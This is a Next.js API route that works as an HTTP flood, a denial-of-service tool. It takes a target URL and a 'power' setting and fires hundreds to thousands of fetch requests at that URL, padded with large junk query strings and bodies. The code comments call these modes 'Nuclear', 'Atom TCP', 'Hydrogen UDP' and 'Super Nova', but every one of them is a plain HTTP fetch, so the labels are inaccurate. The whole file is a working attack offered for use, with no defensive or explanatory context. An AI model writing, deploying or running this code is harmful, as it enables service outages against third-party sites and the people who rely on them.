import { NextResponse } from 'next/server';

export async function POST(request: Request) {
  try {
    const { url, power } = await request.json();

    if (power === 100) {
      // Original Nuclear HTTP Logic
      for (let i = 0; i < 100; i++) {
        fetch(url + '?nuclear=' + Math.random() + '&' + 'X'.repeat(5000), { mode: 'no-cors', cache: 'no-store' }).catch(() => {});
      }
    } else if (power === 200) {
      // Original Atom TCP Logic
      for (let i = 0; i < 200; i++) {
        fetch(url + '?syn=' + Math.random(), { mode: 'no-cors' }).catch(() => {});
      }
    } else if (power === 300) {
      // Original Hydrogen UDP Logic
      for (let i = 0; i < 500; i++) {
        fetch(url + '?udp=' + Math.random(), { method: 'POST', body: 'X'.repeat(10000) }).catch(() => {});
      }
    } else if (power === 500) {
      // Original Super Nova Logic
      for (let i = 0; i < 1000; i++) {
        fetch(url + '?nova=' + Math.random() + '&' + 'X'.repeat(10000)).catch(() => {});
        fetch(url + '?super=' + Math.random(), { method: 'POST', body: 'X'.repeat(50000) }).catch(() => {});
      }
    }

    return NextResponse.json({ success: true });
  } catch (e) {
    return NextResponse.json({ success: false }, { status: 500 });
  }
}